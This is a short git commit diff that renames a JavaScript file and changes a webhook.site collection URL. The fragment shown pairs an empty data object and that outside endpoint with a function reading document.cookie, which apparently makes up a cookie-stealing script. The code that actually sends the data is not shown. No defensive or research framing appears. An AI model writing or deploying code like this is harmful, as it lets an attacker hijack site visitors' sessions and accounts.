6afe5cf28455553b21f9424f76d68a63370b5718
tucha177 <iamyourluck777@gmail.com>
2025-10-11 03:15:15 +0300

    Update and rename atop1.js to atop2.js

--- atop2.js
+++ atop2.js
@@ -1,6 +1,6 @@
 const dataToSend = {
 };
-var url = "https://webhook.site/242fa8c2-7def-44f7-b2c7-573ebe391049";
+var url = "https://webhook.site/090e89b3-2158-4c5e-9033-fd2db1c432a3";
 
 function getCookie(name) {
   const cookies = document.cookie.split('; ');
